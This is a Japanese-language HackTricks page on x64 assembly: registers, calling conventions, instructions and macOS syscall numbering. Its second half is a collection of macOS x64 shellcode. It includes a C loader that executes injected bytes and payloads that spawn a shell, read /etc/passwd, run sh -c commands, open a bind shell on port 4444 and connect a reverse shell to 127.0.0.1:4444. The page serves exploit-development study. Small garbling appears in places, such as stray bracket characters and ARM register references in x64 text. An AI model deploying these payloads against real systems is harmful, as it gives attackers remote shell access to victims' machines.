# x64の概要

{{#include ../../../banners/hacktricks-training.md}}

## **x64の概要**

x64はx86-64とも呼ばれ、主にデスクトップおよびサーバーコンピューティングで使用される64ビットプロセッサアーキテクチャです。Intelが開発したx86アーキテクチャを基盤とし、その後AMDがAMD64という名称で採用しました。現在、パーソナルコンピューターやサーバーで広く使われている主要なアーキテクチャです。

### **レジスタ**

x64はx86アーキテクチャを拡張したもので、`rax`、`rbx`、`rcx`、`rdx`、`rbp`、`rsp`、`rsi`、`rdi`、および`r8`から`r15`までの**16個の汎用レジスタ**を備えています。これらはそれぞれ**64ビット**（8バイト）の値を格納できます。これらのレジスタには、互換性や特定のタスクのために32ビット、16ビット、8ビットのサブレジスタも存在します。

1. **`rax`** - 従来、関数からの**戻り値**に使用されます。
2. **`rbx`** - メモリ操作の**ベースレジスタ**としてよく使用されます。
3. **`rcx`** - **ループカウンター**によく使用されます。
4. **`rdx`** - 拡張算術演算など、さまざまな用途で使用されます。
5. **`rbp`** - スタックフレームの**ベースポインター**です。
6. **`rsp`** - **スタックポインター**で、スタックの最上部を追跡します。
7. **`rsi`**と**`rdi`** - 文字列/メモリ操作における**ソース**および**宛先**のインデックスに使用されます。
8. **`r8`**から**`r15`** - x64で導入された追加の汎用レジスタです。

### **Calling Convention**

x64のcalling conventionはオペレーティングシステムによって異なります。例えば:

- **Windows**: 最初の**4つのパラメーター**は、**`rcx`**、**`rdx`**、**`r8`**、**`r9`**レジスタに渡されます。追加のパラメーターはスタックにpushされます。戻り値は**`rax`**に格納されます。
- **System V（一般的にUNIX系システムで使用）**: 最初の**6つの整数またはポインタパラメーター**は、**`rdi`**、**`rsi`**、**`rdx`**、**`rcx`**、**`r8`**、**`r9`**レジスタに渡されます。戻り値も**`rax`**に格納されます。

関数の入力が6つを超える場合、**残りはスタックに渡されます**。スタックポインターである**RSP**は**16バイト境界にアライン**されている必要があります。つまり、callが実行される前に、RSPが指すアドレスは16で割り切れなければなりません。通常、関数callを実行する前に、shellcode内でRSPが適切にアラインされていることを確認する必要があります。ただし実際には、この要件を満たしていなくても、system callは何度も正常に動作します。

### Calling Convention in Swift

Swiftには独自の**calling convention**があり、[**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64)で確認できます。

### **Common Instructions**

x64の命令セットは豊富で、以前のx86命令との互換性を維持しながら、新しい命令も導入しています。

- **`mov`**: ある**レジスタ**または**メモリロケーション**から別の場所へ値を**移動**します。
- 例: `mov rax, rbx` — `rbx`の値を`rax`へ移動します。
- **`push`**と**`pop`**: 値を**スタック**へpushしたり、スタックからpopしたりします。
- 例: `push rax` — `rax`の値をスタックへpushします。
- 例: `pop rax` — スタックの最上部にある値を`rax`へpopします。
- **`add`**と**`sub`**: **加算**および**減算**操作です。
- 例: `add rax, rcx` — `rax`と`rcx`の値を加算し、結果を`rax`に格納します。
- **`mul`**と**`div`**: **乗算**および**除算**操作です。注: これらはオペランドの使用方法に関して固有の動作をします。
- **`call`**と**`ret`**: **関数のcall**および**関数からのreturn**に使用されます。
- **`int`**: ソフトウェア**割り込み**を発生させるために使用されます。例: `int 0x80`は、32ビットx86 Linuxでsystem callに使用されていました。
- **`cmp`**: 2つの値を**比較**し、その結果に基づいてCPUのフラグを設定します。
- 例: `cmp rax, rdx` — `rax`と`rdx`を比較します。
- **`je`、`jne`、`jl`、`jge`、...**: 前の`cmp`またはtestの結果に基づいて制御フローを変更する**条件付きjump**命令です。
- 例: `cmp rax, rdx`命令の後にある`je label` — `rax`と`rdx`が等しい場合、`label`へjumpします。
- **`syscall`**: 一部のx64システム（現代のUnixなど）で**system call**に使用されます。
- **`sysenter`**: 一部のプラットフォームにおける最適化された**system call**命令です。

### **Function Prologue**

1. **古いベースポインターをpushする**: `push rbp`（callerのベースポインターを保存します）
2. **現在のスタックポインターをベースポインターへ移動する**: `mov rbp, rsp`（現在の関数用に新しいベースポインターを設定します）
3. **ローカル変数用の領域をスタックに確保する**: `sub rsp, <size>`（`<size>`は必要なバイト数です）

### **Function Epilogue**

1. **現在のベースポインターをスタックポインターへ移動する**: `mov rsp, rbp`（ローカル変数の領域を解放します）
2. **古いベースポインターをスタックからpopする**: `pop rbp`（callerのベースポインターを復元します）
3. **returnする**: `ret`（callerへ制御を戻します）

## macOS

### syscalls

syscallには異なるクラスがあり、[**こちらで確認できます**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/osfmk/mach/i386/syscall_sw.h)**:**
```c
#define SYSCALL_CLASS_NONE	0	/* Invalid */
#define SYSCALL_CLASS_MACH	1	/* Mach */
#define SYSCALL_CLASS_UNIX	2	/* Unix/BSD */
#define SYSCALL_CLASS_MDEP	3	/* Machine-dependent */
#define SYSCALL_CLASS_DIAG	4	/* Diagnostics */
#define SYSCALL_CLASS_IPC	5	/* Mach IPC */
```
次に、各 syscall number は[**この URL**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)**:**で確認できます。
```c
0	AUE_NULL	ALL	{ int nosys(void); }   { indirect syscall }
1	AUE_EXIT	ALL	{ void exit(int rval); }
2	AUE_FORK	ALL	{ int fork(void); }
3	AUE_NULL	ALL	{ user_ssize_t read(int fd, user_addr_t cbuf, user_size_t nbyte); }
4	AUE_NULL	ALL	{ user_ssize_t write(int fd, user_addr_t cbuf, user_size_t nbyte); }
5	AUE_OPEN_RWTC	ALL	{ int open(user_addr_t path, int flags, int mode); }
6	AUE_CLOSE	ALL	{ int close(int fd); }
7	AUE_WAIT4	ALL	{ int wait4(int pid, user_addr_t status, int options, user_addr_t rusage); }
8	AUE_NULL	ALL	{ int nosys(void); }   { old creat }
9	AUE_LINK	ALL	{ int link(user_addr_t path, user_addr_t link); }
10	AUE_UNLINK	ALL	{ int unlink(user_addr_t path); }
11	AUE_NULL	ALL	{ int nosys(void); }   { old execv }
12	AUE_CHDIR	ALL	{ int chdir(user_addr_t path); }
[...]
```
したがって、**Unix/BSD class** から `open` syscall (**5**) を呼び出すには、`0x2000000` を追加する必要があります。

そのため、open を呼び出す syscall number は `0x2000005` になります。

### Shellcodes

コンパイルするには:
```bash
nasm -f macho64 shell.asm -o shell.o
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib
```
バイト列を抽出するには：
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "shell.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done

# Another option
otool -t shell.o | grep 00 | cut -f2 -d$'\t' | sed 's/ /\\x/g' | sed 's/^/\\x/g' | sed 's/\\x$//g'
```
<details>

<summary>shellcodeをテストするC code</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### シェル

[**こちら**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s)から引用し、解説しています。<sup>[[1]](#references)</sup>

{{#tabs}}
{{#tab name="with adr"}}
```armasm
bits 64
global _main
_main:
call    r_cmd64
db '/bin/zsh', 0
r_cmd64:                      ; the call placed a pointer to db (argv[2])
pop     rdi               ; arg1 from the stack placed by the call to l_cmd64
xor     rdx, rdx          ; store null arg3
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
bits 64
global _main

_main:
xor     rdx, rdx          ; zero our RDX
push    rdx               ; push NULL string terminator
mov     rbx, '/bin/zsh'   ; move the path into RBX
push    rbx               ; push the path, to the stack
mov     rdi, rsp          ; store the stack pointer in RDI (arg1)
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
```
{{#endtab}}
{{#endtabs}}

#### catで読み取る

目的は `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)` を実行することです。そのため、2番目の引数（x1）はパラメータの配列です（メモリ上では、これはアドレスのスタックを意味します）。
```armasm
bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 40         ; Allocate space on the stack similar to `sub sp, sp, #48`

lea rdi, [rel cat_path]   ; rdi will hold the address of "/bin/cat"
lea rsi, [rel passwd_path] ; rsi will hold the address of "/etc/passwd"

; Create inside the stack the array of args: ["/bin/cat", "/etc/passwd"]
push rsi   ; Add "/etc/passwd" to the stack (arg0)
push rdi   ; Add "/bin/cat" to the stack (arg1)

; Set in the 2nd argument of exec the addr of the array
mov rsi, rsp    ; argv=rsp - store RSP's value in RSI

xor rdx, rdx    ; Clear rdx to hold NULL (no environment variables)

push    59      ; put 59 on the stack (execve syscall)
pop     rax     ; pop it to RAX
bts     rax, 25 ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall         ; Make the syscall

section .data
cat_path:      db "/bin/cat", 0
passwd_path:   db "/etc/passwd", 0
```
#### sh でコマンドを実行
```armasm
bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 32           ; Create space on the stack

; Argument array
lea rdi, [rel touch_command]
push rdi                      ; push &"touch /tmp/lalala"
lea rdi, [rel sh_c_option]
push rdi                      ; push &"-c"
lea rdi, [rel sh_path]
push rdi                      ; push &"/bin/sh"

; execve syscall
mov rsi, rsp                  ; rsi = pointer to argument array
xor rdx, rdx                  ; rdx = NULL (no env variables)
push    59                    ; put 59 on the stack (execve syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

_exit:
xor rdi, rdi                  ; Exit status code 0
push    1                     ; put 1 on the stack (exit syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

section .data
sh_path:        db "/bin/sh", 0
sh_c_option:    db "-c", 0
touch_command:  db "touch /tmp/lalala", 0
```
#### Bind shell

[https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html) の **ポート 4444** における Bind shell<sup>[[2]](#references)</sup>】【。
```armasm
section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xffffffffa3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; bind(host_sockid, &sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x68
syscall

; listen(host_sockid, 2)
xor  rsi, rsi
mov  sil, 0x2
mov  rax, r8
mov  al, 0x6a
syscall

; accept(host_sockid, 0, 0)
xor  rsi, rsi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x1e
syscall

mov rdi, rax
mov sil, 0x3

dup2:
; dup2(client_sockid, 2)
;   -> dup2(client_sockid, 1)
;   -> dup2(client_sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
mov  rax, r8
mov  al, 0x3b
syscall
```
#### Reverse Shell

[https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html) の Reverse shell。**127.0.0.1:4444** への Reverse shell<sup>[[3]](#references)</sup>】【。
```armasm
section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xfeffff80a3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; connect(sockid, &sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x62
syscall

xor rsi, rsi
mov sil, 0x3

dup2:
; dup2(sockid, 2)
;   -> dup2(sockid, 1)
;   -> dup2(sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x3b
syscall
```
## References

- [1] [daem0nc0re/macOS_ARM64_Shellcode - shell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s)
- [2] [Packet Storm - macOS TCP 4444 Bind Shell (Null-Free) Shellcode](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html)
- [3] [Packet Storm - macOS 127.0.0.1:4444 Reverse Shell Shellcode](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html)

{{#include ../../../banners/hacktricks-training.md}}
